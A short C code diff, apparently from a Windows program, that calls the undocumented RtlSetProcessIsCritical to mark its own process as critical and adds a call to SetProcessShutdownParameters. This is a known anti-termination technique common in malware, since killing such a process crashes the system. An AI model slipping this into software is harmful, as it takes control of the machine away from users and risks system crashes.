@@ -10,6 +10,7 @@ int SetIsCritic(void){
 	   (SetCritical) = (pRtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hNTDLL, "RtlSetProcessIsCritical");
 	   if(SetCritical){
          	SetCritical(TRUE,NULL,FALSE);
+		SetProcessShutdownParameters(0,0);
 	   }
 	   return 1;
    }
